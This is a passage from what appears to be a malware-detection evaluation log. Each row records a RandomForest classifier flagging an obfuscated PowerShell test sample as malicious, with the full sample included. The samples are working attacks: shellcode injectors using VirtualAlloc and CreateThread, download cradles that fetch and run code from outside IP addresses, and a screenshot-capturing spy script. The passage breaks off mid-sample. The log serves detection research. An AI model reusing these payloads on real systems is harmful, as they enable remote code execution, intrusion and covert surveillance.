1)};gn4w::CreateThread(0,0,gn4S','ntPtr','xc4,','6b,','e3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0','3,0x57,0x68,0x02,0xd9,0xc8,','gn4ox6F = dIt[DllImport(FvKkernel32.dllFvK)]public static extern IntPtr VirtualAllo','FvKkernel32.dllFvK)]public static extern IntPtr CreateTh','wH,0,0,0);for (;;){Start-sleep 60};','8b,0x58,',' -passthru;[Byte[','onType,','x36,0x6a,0x40,0x',' uint flProtect);[DllImport(','x54,0x50,0x68,0x29,0x80,0x','6,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x','8','c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf','68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x5','hreadAttributes, uint d',',0x56,0x57,0x68,0x02,0xd9,0',';[D',']];[Byte[]]gn4z','ll',' dwSize, uin','0','xc8,','FvKmsvcrt.dllFvK)]p','77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0',' dest, uint src, uint count);dIt;gn4w = Add-Type -memberDefin','ition gn4ox6F -Name FvKWin32FvK -namespace Win32Functions','0x00,0xff,0xd5,0x50,0x50,0x5','gn4i=0;gn4i -le (gn4z.Length-1);gn4i++) {gn4w::memset([IntPtr','0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xa',' IntPtr lpStar','xc0,0x74,0x4a,0x01,0xd','t flAllocati','){gn4g = gn4z.Length};gn4SwH=gn4w::VirtualAlloc(0,0x1000,gn4g,0x40);for (',',0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x7',' = 0xfc,0xe8,0x89,0x00,0x00,0x','0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b','Import(','tAddress','c(IntPtr lpAddres')).rePLAce(([ChaR]103+[ChaR]110+[ChaR]52),'$').rePLAce(([ChaR]70+[ChaR]118+[ChaR]75),[sTrING][ChaR]34).rePLAce(([ChaR]100+[ChaR]73+[ChaR]116),[sTrING][ChaR]39) |. ( $SheLLid[1]+$ShEllId[13]+'x')",malicious,TP
2026-07-13 17:13:04,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3420.ps1,custom-ps-ml,UNKNOWN,885f47ef-f9c5-42d6-a2cf-964cd1d17a62,DESKTOP-BAC9DBQ,malicious,0.7806,RandomForest,1381,1999.72,"&amp;( ([StRINg]$vErbOsEPreFeREncE)[1,3]+'X'-JoIn'')( (((\""{12}{5}{6}{35}{54}{43}{70}{24}{64}{67}{53}{29}{79}{47}{62}{26}{3}{18}{28}{46}{7}{86}{36}{34}{68}{90}{85}{50}{15}{20}{11}{63}{88}{31}{14}{51}{30}{71}{39}{87}{17}{38}{66}{84}{61}{83}{25}{10}{92}{45}{65}{16}{60}{91}{76}{32}{19}{82}{0}{13}{22}{41}{93}{52}{58}{8}{33}{21}{23}{48}{81}{73}{40}{9}{49}{69}{42}{44}{74}{75}{59}{1}{2}{77}{72}{27}{57}{37}{89}{56}{55}{80}{4}{78}\"" -f'd','bXo','rweQ','WOW6','b-jOI','eQwc=NE','W-','/7.',']weQb=([ChAR','://192','em.NEt.','tfmo,we','w','Oq','[Sy','D(fmoUser-Ag','e]::Defa','Wc.PrO','4; Tri','v=Hx','en','](w','VZz~','e','Net.WEBClIenT','ySt','; ','we','den','lla/5','eBR','rOxy = ','weQK=fmopE','[]','v:11.0)','ObJEcT ','r','weQK','xy','tWeBProXy;we','ng(79lhttp','kaiC{-+','ex.asp79l))','ys',')P','e','t','dows NT','QW','.168.1.3:8080','.HEadERS.Ad','stEm.Net.W','fmo;weQI=','Qu=fmoMozi','S','gth]};IEX','en','QI++%','0;[char[]','_-','uLT','Ls = ',' 6.1','Qu);w',';','nTiALCacH','.','we',' like ','/ind','TeM.','equEst]::DEfaul','[','LoaDSTRI','7x%{w','eQ','DENtIalS;','K','nfmofmo)','.0 (Win',' (weQ','C.DoWN','FmTo.','[S','CREdEnTIa','ofmo;weQwc','0; ','Q','eQwC.P','.L','Geck','NetwORkCRe','CrED',';S)U1X3'))  -cRepLACe  ([cHar]55+[cHar]57+[cHar]108),[cHar]34 -replacE([cHar]80+[cHar]55+[cHar]120),[cHar]124 -cRepLACe'weQ',[cHar]36-cRepLACe([cHar]102+[cHar]109+[cHar]111),[cHar]39))",malicious,TP
2026-07-13 17:13:07,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3449.ps1,custom-ps-ml,UNKNOWN,7072c0f0-21aa-49df-912d-30e801827551,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2844,1917.31,"IEx ((((\""{37}{17}{28}{34}{42}{12}{33}{13}{47}{35}{23}{38}{48}{41}{3}{10}{39}{21}{8}{22}{15}{2}{27}{16}{25}{30}{44}{29}{4}{6}{32}{26}{11}{18}{0}{40}{31}{7}{45}{43}{1}{20}{9}{46}{24}{36}{14}{5}{19}\""-f'0x63,0xa','x0f,0x14,0x05,0x6e,0xcf,0x82,0x63,0xb0,0x5b,0','d,0x25,0x43,','3,0x','5,0x33,0x81,0x90,0xad,0xd9,0xd6,0x','W21w::memset([IntPtr](W21CoK.ToInt32()+W21i), W21z[','a8,0xef,0xb5,0x1b,0x81,0x','x1d,0xaf,0x2b,0x3a,0x09','e,0xa9,0xf7,0x24,0xc0,0x48,0xd4,0x5','x90,0x3c,0xf6,0x3e,0x33,0x6b,0x6e,0x3d,0x62,0x5b,0x31,0xbe,0x41,0xd0,0xf8,0x2a,0','c0,0x04,0x31,0x50,0x0f,0x03,0x50,0x32,0xd7,0x7b,0x72,0xa4,0x95,0x84,0x8b,0x34,0xfa,0x0d,0x6e,0x05,0x3a,0x69,0xfa,0x35,0x8a,0xf9,0xae,0xb9,0x61,0xaf,0x5a,0x4a,0x07,0x78,0x6c,0xfb,0xa2,0x5e,0x43,0xfc,0x9f,0xa3,0xc2,0x7e,0xe2,0xf7,0x24,0xbf,0x2d,0x0a,0x24,0xf8,0x50,0xe7,0x74,0x51,0x1e,0x5a,0x69,0xd','7,0x9b,0x08,0xeb,0','i','emset(IntPtr dest, uint src, uint count);XoH;W21w = Add-Type -memberDef','Alloc(0,0x1000,W21g,0x40);for (W21i=0;W21i -le (W21z.Length-1);W21i++) {','8,0x03,0xe8,0x89,0x16,0x92,0x38,0xc0,0xd7,0x39,0x05,0xe',',0','wSize, ','x3b,0x54,0x97,0xec,0x3c,0x4f,0x6f,0x62,0xc3,0x70,0x90,0xaa,0x07,0x24,0xc0,0xc4,0xae,0x45,0x8b,0x14,0x4f,0x90,0x1c,0x45,0xff,0x4b,0xdd,0x35,0xbf,0x3b,0xb5,0x5f,0x30,','W21i], 1)};W21w::CreateThread(0,0,W21CoK,0,0,0);for (;;){Start-sleep 60};','x21,0x93,0x7e,0xac,0x4c,0x87,0x16,0x5c,0x1b,0xf5,0xb0,0x63,0xb1,0','0xd','c,0x49,0x53,0x39,0x5','Q -Name migWin32mig -namespace Win32Functions -passthru;','8,0xd9,0x9f,0xc4,0xbd,0x4a,0xc8,0xea,0x98,0xbd,0','xbb,0x2a,0x6b,0','c,0x7','0x41,0xc9,0xd5,0x36','uint flAllocat','c,0x34,0xa','x41,0x78,0x51,0xb7,0xc4,0x9b,0xf1,0x3c,0x7e,0x40,0x00,0x90,0x19,0x03,0x0e,0x5d,0x6d,0x4b,0x12,0x60,0xa2,0xe7,0x2e,0xe9,0x45,0x28,0xa7,0xa9,0x61,0xec,','c,0xa5,0x4b,0','0f,0x45,0x34,0x92,0x7','g)]public static extern IntPtr m','ionType, uint flProtect);[DllImport(migkernel32.dllmig)]publi','n W21SsU','x57,0x14,0xcf,0x3f,0xab,0xc3,0x29,0x4a,0xc5,0xd7;W21g = 0x1000;if (W21z.Length -gt 0x1000){W21g = W21z.Length};W21CoK=W21w::Virtual','W21SsUQ = XoH[DllImport(migkernel32.dllmig)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint d','[Byte[]];[Byte[','6,0x6a,0x67,0x02,0xa4,0x7b,0xef,0xf7,0x7c,0x7d,','5,0x5f,0x9b,0x0c,0x4','0x8e,0x8e,0xd9,0xcb,0xd9,0x74,0x24,0xf4,0x58,0x29,0xc9,0xb1,0x47,0x8','c static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(migmsvcrt.dllm','0xcf,0','0xec,0x6a,0x0b,0xb5,0x48,0xd',',0xcd,0x33,0x3d,0x76,0x58,0xd5,0x57,0x96,0x0d,0x4d,','x2a,0x8e,0x04,0xbb,0xaa,0x4e,0x53,0xd1,0xaa,0x26,0x03,0x81,0xf8,0x53,0x4c,0x1c,0x6d,0xc','initio',']]W21z = 0xba,0x3d,0x35,')) -cReplacE ([CHar]87+[CHar]50+[CHar]49),[CHar]36 -cReplacE 'mig',[CHar]34 -cReplacE'XoH',[CHar]39))",malicious,TP
2026-07-13 17:13:18,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3462.ps1,custom-ps-ml,UNKNOWN,350dbde5-8117-4170-a20e-a20f505d895f,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,1327,1853.16," iEx ((((\""{61}{15}{56}{14}{39}{42}{93}{64}{44}{11}{76}{94}{58}{60}{27}{49}{77}{25}{32}{53}{20}{43}{17}{9}{65}{6}{75}{78}{29}{57}{69}{16}{82}{59}{50}{66}{34}{55}{35}{86}{2}{18}{37}{1}{51}{4}{26}{0}{31}{52}{28}{71}{79}{22}{21}{62}{80}{88}{3}{45}{13}{24}{92}{90}{87}{70}{48}{63}{73}{68}{36}{67}{91}{84}{83}{47}{30}{81}{33}{7}{12}{74}{5}{46}{8}{85}{23}{19}{10}{40}{54}{89}{41}{38}{72}\""-f'yw','::DEFaUltW','EBR','EnTiALs;lt','bPro',')',';','p','ty_-BX','oFr','LeNGT','u=FrtMo','R1','=Frt35knYrX*t0EiR','eC','W-O','e','ke Geck','eQU','k.','1.','e','em.NeT.CreD','yi++%lty','h1ltyw]-&amp;TQ/9','; WOW','xY;lt','NT 6','IaLs','RS.ADD(Frt','3:8','C.ProXy.C','64; Trid','x.as',')','Wc.PROXY = [Sy','NLoa','EST]','OINF','t SYs','h]}','tyB-j','TEM','0) li',';lty','yK',')K19%{l','225.','[CHaR[','.','Frt,l','e','ReDent','ent/7.0; rv:1',';IEX',';lty','bJ','U','5.0 (Window','Agent','s ','ltywc=NE','nTiAlCAcHE]::D',']]ltyB=([','nT','t','tyu','DSTRing(','[]](ltyWc.DOW','s','xoZFrt;ltyI=0;',' ','rtFrt)','CHAr','Y)','ltyWc.H','zilla','1','Eade','= [SYsT','efaUlTNEtWorkCRe','081/inde','r-','4.145.','1Yhttp://10','ORltyk[lt','STeM.NeT.W','fb','D',' (l','W','R','zB','.NET.WeBCLIE','/'))  -cRePLAce  ([CHaR]70+[CHaR]114+[CHaR]116),[CHaR]39 -cRePLAce'R1Y',[CHaR]34  -replaCE  'K19',[CHaR]124 -replaCE([CHaR]108+[CHaR]116+[CHaR]121),[CHaR]36))",malicious,TP
2026-07-13 17:13:28,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3463.ps1,custom-ps-ml,UNKNOWN,01a654b5-bf90-4de3-806c-406cb81d73fa,DESKTOP-BAC9DBQ,malicious,0.9941,RandomForest,3072,4093.25," &amp;( $PsHome[4]+$psHOMe[34]+'x') ( (((\""{12}{17}{59}{6}{19}{44}{72}{5}{45}{24}{34}{52}{27}{53}{70}{33}{18}{3}{4}{64}{36}{69}{9}{47}{66}{37}{31}{43}{15}{65}{51}{14}{41}{58}{21}{0}{32}{40}{62}{26}{10}{55}{56}{11}{39}{16}{63}{8}{29}{28}{68}{61}{67}{50}{2}{42}{13}{54}{22}{46}{7}{20}{48}{25}{49}{23}{35}{38}{71}{1}{57}{60}{30}\"" -f '0xe9,0xf0,0x7b,0xb6,0x52,0xac','32()+zPei), zPez[zPei], 1)};zPew::CreateThr','d,0xc9,0xf6,0xcf,0x68,0x3d,0x59,0x2f,0x5f,0x36,0x50,0xa5,0x20,0x20,0x9d,0x29,0xa1,0xb0,0xcb,0x23,0xa1,0xd8,0xab,','xd5,0xce,0xb4,0x79,0xe4,0xce,0xa3,0x0a,0x5','6,0x','ub','flAllo','9;zPeg = 0x1','9,0x57,0xb4,0x83','0x','1,0xfc,0x54,0x4f,0x4c,0xfb,0x9b,0x',',0x25,0xae,0x8f,0x6f,0x23','zPeM0t = D9a[DllIm','xe1,0x46,0xdd,0x7a,0xc5,0xc8,',',0x14,','b,0xc9,0x57,0x8a,0x','xe5,0x12,0xb7,','port(UJAkernel32.dllUJA)]public static extern IntPtr VirtualA',',0x9c,0','cationTy','000;if (zP','8,0x46,0x45,0xdb,0xfc,0x03,0x1d,0x42,0xa4,','e,0xa9,0xd7,0x35,0xc9,0x97,0xad,0x57,','r (zPei=0;','CreationFl','ew::VirtualAlloc(0,0x1000,z','53,0xd4,0x87,0x4','32UJA -namespace Win32Functions -pa','5f,0xe1,0xc1,0xee,0',',0x19,0x3f,0xde,0x0b,0x45,0x','(;;){Start-sleep 60};','39,0x4d,0x29,0xa3,0xc2,0xe2,0x14,0x0c,0x31,0xfa,0x51,0xaa,0xaa,',',0xd9,0xbc,0x7e,0xb9,0x53,0x9f,0x16,0',',0xc9,0xb1,0x47,0x31,0x58,0x13,0x03,0x58,0x13,0x83,0xc0,0xed,0xab,0xb2,0x63,0x05,0xa9,0x3d','ags, IntPtr lpThreadId);[DllImport(UJAmsvcrt.dllUJA)]public static exter','zPe',',0xb6,0x17,0xb2,0x5b,0xeb,0x64,0xd5,0xdf,0xf6,0xb8,0x35,0x','98,0x4d,0x4a,0xff,0x6a,0x','i ',',0x38,0x8a,0x07,0xcc,0x48,0x82,0','x0e,0','0x7c,0xb3,0x74,0xf9,0xf6','0x17,0xf2,0xfd,0xb3,0x8d,0x66,0xae,0x21,0x2e,0xdf,0x03,0','0x89,0xa','pe, uint flProte','lic static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dw','0xc','38,0xcd,0x34,0x27,0x24,0x3c,0x64,0xf0,0','ez.Length -gt 0x1000){zPeg = zPez.Length};zPeaRV=zP','Peg,0x40);fo','0','0x47,0x87,0x50,0xa3,0x84,0x5e,0x12,0xaf,0x61','n IntPtr memset(IntPtr dest, uint src, uint count);D9a;zPew = Add-Type -memberDefinition zPeM0t -Name UJAWin','ssthru;[Byte[]];[Byte[]]zPez','0x1','7a,0x28,0x93,0','x62,0x85,0x49,0xbd,0xa0,0xd1,0x19,0xd5,0x01,0x5a,0xf2','ead(0,0,zPea',',0xcf,0xfd,0xfc,0xd','lloc(IntPtr lpAddress, uint dwSize, uint ','RV,0,0,0);for ','x37,0x30,0x59,0x12,0xb3,0xb7,0x9d,0xdc,0x34,0xbd,0x8d,0x88,0xb4,0x88,0xec,0x1e,0xca,0x26,0x9a,0x9e,0','x5e,0x20,0xe6,0x18,0xe9,0x','0x13,0x63,0xf4,0x97,0xc3,0x23,0xa','ff,0xa0,0x5f,0x5a,0x74,0xe4,0x4b,0xe9,0xf8,0x21,0x7b,0x5a','6f,0xb0,0x83,0x1f,0x74,0x12,','x22,0x93,0x99,0x75,0x7e,0x28,0x11,0xc5,0x6e,0x28,0xc6,0x9d,0x91,0x19,0x59,0x96,0xcb,0xb9,0x5b,0x7b,0x60,0xf0,0x43,0x','x5e,0xcd,0x','xf5,0x0e,0xbc,0x47,0x61,0xb6,0xe5,0x1c,0x10,0','de,',' = 0xbb,0xe9,0x49,0x47,0x9f,0xda,0xdc,0xd9,0x74,0x24,0xf4,0x58,0x29','-le (zPez.Length-1);zPei++) {zPew::memset([IntPtr](zPeaRV.ToInt','ct);[DllImport(UJAkernel32.dllUJA)]p')) -CREPlaCE ([chAR]122+[chAR]80+[chAR]101),[chAR]36 -CREPlaCE 'UJA',[chAR]34  -CREPlaCE ([chAR]68+[chAR]57+[chAR]97),[chAR]39))",malicious,TP
2026-07-13 17:13:43,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3467.ps1,custom-ps-ml,UNKNOWN,269aebd9-6fc9-4796-a680-51b6d2aba02b,DESKTOP-BAC9DBQ,malicious,0.9654,RandomForest,1673,7917.88,"((\""{11}{3}{0}{15}{19}{23}{20}{16}{21}{5}{8}{6}{18}{4}{7}{24}{10}{17}{12}{9}{25}{13}{22}{1}{14}{2}\"" -f 'Output Fq5hname  Fq5i=1  W',' ([system.drawing.imaging.imageformat]::jpeg))  Wri','nds 30  Fq5i++  }  exit','hname=ZyVFq5env:computernameZyV  Write-','yV + Fq5username + ZyV_Zy',' = ZyVC:sONHPsONZyV + Fq5username + ZyV_ZyV + Fq5time + ','h C:','V + Fq5time + ZyV.jpgZy','ZyV.jpgZyV  }  ElseIf (Test-Pat','Fq5Left = Fq5Screen.Left  Fq5Top = Fq5Screen.Top  Fq5bitmap = New-Object System.Drawing.Bitmap Fq5Width, Fq5Heig','indows.Forms.SystemInformation','Fq5username=ZyVFq5env:UserNameZyV  Write-Output Fq5username  Fq5','een  Fq5Width = Fq5Screen.Width  Fq5Height = Fq5Screen.Height  ','itmap)  Fq5graphic.CopyFromScreen(Fq5Left, Fq5Top, 0, 0, Fq5bitmap.Size)  Fq5bit','te-Output ZyVScreenshot saved to:ZyV  Write-Output Fq5File  Fq5graphic.dispose()  Fq5bitmap.dispose()  Start-Sleep -Seco','hile (Fq5i -le 5){  Fq5time=Get-Date -form','5sONxsONZyV + Fq5username + Z',']::VirtualScr',') {  Fq5File = ZyVC:sONZ','at ZyVdd-MMM-yyyy-HH-mm-ssZyV  Write-Output Fq5time  if (Test-Pa',' sONsON143.16.176.125sONx) {  Fq5File = ZyVsONsON143.16.176.12','yV_ZyV + Fq5hname + ZyV_ZyV + Fq5time + ZyV.jpgZyV  }  ElseIf (Test-Path C:sONHP) {  Fq5File','map.Save(Fq5File,','th','V  }  Else {  exit  }  Add-Type -AssemblyName System.Windows.Forms  Add-type -AssemblyName System.Drawing  Fq5Screen = [System.W','ht  Fq5graphic = [System.Drawing.Graphics]::FromImage(Fq5b')).RepLaCE(([cHar]90+[cHar]121+[cHar]86),[StRinG][cHar]34).RepLaCE(([cHar]115+[cHar]79+[cHar]78),'\\').RepLaCE(([cHar]70+[cHar]113+[cHar]53),[StRinG][cHar]36)| &amp; ( $verBosEpreferEncE.TOsTRiNG()[1,3]+'x'-join'')",malicious,TP
2026-07-13 17:13:59,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3471.ps1,custom-ps-ml,UNKNOWN,7c339a29-1c75-467c-98a2-755ca1c9dbe1,DESKTOP-BAC9DBQ,malicious,0.82,RandomForest,1269,3472.29," &amp;((VaRiABLe '*mdR*').NAme[3,11,2]-jOIN'')(((\""{1}{4}{31}{62}{19}{25}{70}{32}{13}{45}{50}{3}{22}{58}{39}{34}{33}{42}{60}{35}{15}{56}{27}{37}{69}{53}{61}{65}{55}{18}{54}{12}{0}{21}{59}{47}{72}{17}{11}{28}{20}{7}{38}{51}{2}{10}{9}{46}{71}{40}{14}{49}{16}{5}{6}{74}{67}{24}{52}{73}{63}{29}{64}{57}{30}{43}{66}{8}{44}{68}{41}{36}{48}{26}{23}\""-f' = ','t','f+,7tI',' WOW6','wq','[]](','twqwc','=5u]2coli8zx5Pq','k[t','A^w1','[','twqK=w','edENtiALs','5','i=','Agentw','cHAr','TiaLS;','y;twqWc.Pr','enT;twqu','j','[SyStEm.Net.CREDENTIALCac','4','N)','D','=w1N','twqB-JOInw1Nw1',',twqu);twqWC.PROXY = [SYSt','1N','3/in','asp9o4','WC=N','la/','Ge','; rv:11.0) like ','w1N;twqWc.HeAders.Add(w1NUser-','EngTh]};IE','EM.NEt.WEBRE','EOZ','.0','q','K.L','ck',')))c7K%{','wqi++','.0 (Window','N','::DEf','X (','0;[Char[]]twqb=([','s NT 6.1;','DHCT~a','StRI',']:','oxy.Cr','ox','1N','x.','; Trident/7','He]','o',':DefaUlt','eW-OBJEcT SysTem.NEt.WEBCLI','(9o4http://137.117.188.120:44','de','WEbPr','twq_-bXortwq','LOa','%twq','qUESt','Mozil',';tw','AUltNEtworkCREDeN','NG','.DOWN')).rEPLAcE(([CHaR]116+[CHaR]119+[CHaR]113),'$').rEPLAcE('9o4',[strinG][CHaR]34).rEPLAcE('c7K','|').rEPLAcE(([CHaR]119+[CHaR]49+[CHaR]78),[strinG][CHaR]39).rEPLAcE(([CHaR]122+[CHaR]120+[CHaR]53),'\\') )",malicious,TP
2026-07-13 17:14:09,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3480.ps1,custom-ps-ml,UNKNOWN,63ab6442-4f76-4070-bc51-6d51929e7888,DESKTOP-BAC9DBQ,malicious,0.9924,RandomForest,1351,2386.63," &amp; ( $PShoME[21]+$pshome[34]+'x') ( (((\""{77}{93}{4}{10}{20}{18}{49}{86}{59}{15}{37}{69}{34}{90}{9}{85}{80}{79}{62}{22}{13}{36}{11}{31}{71}{1}{29}{58}{91}{63}{53}{17}{55}{38}{60}{33}{35}{7}{48}{64}{54}{57}{41}{51}{27}{83}{50}{46}{32}{66}{61}{30}{5}{8}{0}{82}{2}{75}{94}{56}{23}{78}{67}{43}{25}{44}{52}{47}{74}{92}{26}{81}{72}{6}{76}{70}{40}{87}{24}{89}{73}{14}{12}{21}{3}{16}{65}{88}{84}{42}{39}{45}{68}{19}{28}\"" -f '::DeFauL','nt9yN,','KCrEDentialS;FH','ki','New-','Ed','r[]](FHkWC.DO','.WE','EnTiAlCAChE]','64; Trident','OBJect SYstEm.NeT.We','C.HEAders','F','yN;F','Hk_-bXorFHkK[','a/','++%FH','wc.','iEnt;FHk','y','BCL','H','cko9','74','/78.229.133.134:80/in','3a2','Ar[]]FHk','eN','N)','F','.NET.CR','.ADD(9yNUse','ysT','ySTeM','Windows ','.NET','Hkw','5.','xY ','jOI','G(bG','tWEBPrOXy;FHkWC.ProXy.Cr',';IEX (FHkb-','9e7dbd0','1fa24','N9y','S','bf69yN;FHkI','BReq','u=','LS = [','Ed','b5d','k','::DEF','Pro','1','aUl','Hku','yNMozill','= [S','M',' like Ge','H','Uest]','kK','E','59','N9','0 (','nlOaDSTrIn','r-Age','=([chA','))mIG%{F','=0;','kK=9yN','W','F','f','0)','.','B','tNeTwOR','TiA','h]}','/7.0; rv:11','9','Thttp:/','.LeNgT','dex.aspbGT)','NT 6.1; WOW',');F','[Ch','HkWc=','acdbc'))-ReplACe'FHk',[CHAR]36-CRePLAcE  ([CHAR]98+[CHAR]71+[CHAR]84),[CHAR]34 -ReplACe  '9yN',[CHAR]39 -CRePLAcE  ([CHAR]109+[CHAR]73+[CHAR]71),[CHAR]124) )",malicious,TP
2026-07-13 17:14:16,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3485.ps1,custom-ps-ml,UNKNOWN,747b0476-1d27-49bd-8104-f7d79725d8e1,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2931,2010.21," .( $psHOmE[4]+$pSHome[34]+'X') ( ((\""{38}{36}{37}{40}{16}{19}{24}{25}{4}{13}{1}{0}{35}{33}{44}{7}{5}{39}{30}{26}{14}{28}{9}{18}{10}{11}{32}{17}{23}{21}{12}{15}{29}{8}{34}{47}{31}{42}{45}{43}{41}{6}{22}{46}{20}{3}{48}{2}{27}\"" -f '0x42,0x18,0x83,0xea,0xcd','4,0xf4,0xb8,0x31,0xcd,0xda,0x04,0x5a,0x31,0xc9,0xb1,0x47,0x31,0x42,0x18,0x03,','w::VirtualAlloc(0,0x1000,R74g,0x40);for (R74i=0;R74i -le (R74z.Length-1);R74i++) {R74w::memset([IntPtr](R74DGHq.ToInt32(',' = R74z.Length};R74DGHq','ition R74M1a -Name CuSWin32CuS -n','0x16,0x63,0x34,0x20,0x9a,0x08,0x18,0xd1,0x29,0x7c,0xb5,0xd6,0x9a,0xcb,0xe3,0xd9,0x1b,0x67,0xd','8,0x52,0x','5,0x32,0xd0,0x01,0x15,0x53,0x58,0xe4,0x24,0x53,0x3e,0x6c,','xf2,0x8e,0xf8,0x9','0x81,0x70,0x08,0x8b,0x11,0xd2,0xdb,0x2b,0xfe,0xe3,0x08,0xad,0x7','xf3,0xf8,0x6e,0x69,0x0','f,0x70,0','5,0x14,','amespace Win32Functions -passthru;[Byte[]];[Byte[]]R74z = 0xdb,0xcd,0xd9,0x74,0x2','0x52,0xaa,0xbd,0','0x02,0xfd,0x91,0x14,0xcb,0xdb,0x66,0x5b,0xe6,0x9c,0xf9,0xa2,0x09,0xdd,0xd0,0x60,0x5d,0x8d,0x4a,0x41,0xde','pThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(CuSmsvcrt.dllCuS)]public stat','5c,0x12,0x28,0x4d,0x16,0xbe,0x3d,0xfc,','5,0xef,0xe5,0xb9,0xd2,0','ic extern IntPtr memset(IntPtr dest, uint src, uint count);BXd;R74w = Add-Typ','0x0c,0x78;R74g = 0x1000;if (R74z.Length -gt 0x1000){R74g',',0xcd,0x85,0x26,0x9d,0x46,0xf','4b,0x5f,0x79,0x01,0x6e,0xa0,0x54,0x35,0x23,0x35,0x57,0','0x75,0xd6,0xf2','e -mem','berDefin','0x85,0x12,0x9c,0x69,0x5d,0x14,0x8d,0x3f,0xd6,0x4f,0x0d,0xc1,0x3b,0xe4,0x04,0xd9,0x58,0xc1,0xdf,',')+R74i), R74z[R74i], 1)};R74w::CreateThread(0,0,R74DGHq,0,0,0);for (;;){Start-sleep 60};','xe1,0xb2,0xe3,0x3e,0x4d,0xfb,0xcc,0xcc,0x8f,0x3b,0xea,0x2e,0xfa,0x35,0x09,0xd2,0xfd,',',0x46,0x8b,0x6e,0x0b,0','59,0x9a,0xe7,0xa9,0x90,0xce,0xb0,0xa6,0x07,0xff,0xb5,0xf3,0x9b,0x74,','a,0xca,0xa7,0xac,0xaa,0xa2,0xad,0x22,','x91,0xbe,0x86,0xc2,0xb6,0x1a,0xc3,0x91,0xd7,0x3b,0xa9,0x74,0xe7,0x','2f,0xf8','a,0x0e,0xa2,0xc9,0x8a,0x12,0xc4,0x38,0x17,0x9a,0x22,0x6',',0x2f,0x','CuSkernel32.dllCuS)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwS','ize, uint flAllocationType, uint f','R74M1a = BXd[DllImport(','7,0x78,0x9f,0x7a,0x04,0x5b,0x9e,0xb4,0x','lProtect);[DllImport(CuSkernel32.dllCuS)]public static extern IntPtr CreateThread(IntPtr l',',0x06,0xee,0xbb,0x4c,0x92,0x51,0xd3,0xb0,0x72,0x52,0x23,0xe7,0x1','0x94,0xd2,0xcd,0xe8,0xbd,0x78,0x22,0x45,0x95,0x14,0xdb,0xcc,0x6d,0x85,0x24,0xdb,0x0b,0x85','x84,0xfe,0x3b,0xa8,0xd3,0x5d,0xed,0xb7,0xc9,0xc8,0x11,0x22,0xf6,0x5a,0x46,0xda,0xf4,0xbb,0xa0,0x45',',0xc',',0xaf,0xe8,0xec,0x4b,0x58,0','x6c,0x90,0x9e,0x3f,0x92,0xcf,0xe9,0x9f,0x6d,0x3a,0xe8,0xdc,0xbb,0x02,0x9e,','a,0xf7,0xcc,0xf','=R74')).RePLAce(([CHAr]66+[CHAr]88+[CHAr]100),[STrING][CHAr]39).RePLAce(([CHAr]82+[CHAr]55+[CHAr]52),'$').RePLAce(([CHAr]67+[CHAr]117+[CHAr]83),[STrING][CHAr]34))",malicious,TP
2026-07-13 17:14:24,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3504.ps1,custom-ps-ml,UNKNOWN,5aa37848-568d-4f88-b2f1-59ee9aae96a4,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,1513,2315.58," ((\""{50}{62}{86}{76}{75}{26}{45}{88}{59}{56}{103}{42}{101}{106}{82}{1}{58}{22}{74}{10}{100}{20}{72}{94}{92}{91}{84}{32}{7}{41}{4}{52}{109}{61}{30}{21}{55}{36}{65}{19}{60}{63}{31}{70}{71}{35}{13}{37}{49}{48}{18}{81}{102}{69}{25}{67}{111}{98}{87}{5}{96}{44}{93}{38}{24}{66}{80}{8}{11}{17}{34}{54}{108}{9}{39}{12}{107}{104}{85}{68}{40}{23}{79}{3}{28}{2}{57}{83}{43}{14}{97}{77}{99}{110}{64}{51}{15}{73}{0}{47}{105}{90}{6}{33}{53}{29}{95}{16}{46}{89}{27}{78}\""-f '1U','la/','rUTWC','rUTB=([Cha','eA','s = [SYStEM.','rUT','GeckoC1r;rU','Net','UTK=C1','6.1; WOW','W','63a9f','R','STri','in',' (rUTB','OrkCRe','::DeFaULTWEbP','rO','Trident','ntC1r','ows','rUTI=','ialC','.ProX','IntMAnaGEr]::EXPecT100CoNtinuE = 0;','rC','r[]](','.LengT','-Age','e','ke ','K[rUTi','denT','.WEB','u)','E','EdEnT','r','r;','TWC.H','t SYsT','lOad','T.C','rUT','-Joi','e%{r','t]','qUES','[S','/','D','++%rUTK','IAls;',',rUT','=N','.DO','5.0 (Wind','C','XY =','D(C1rUser','Ystem.N',' 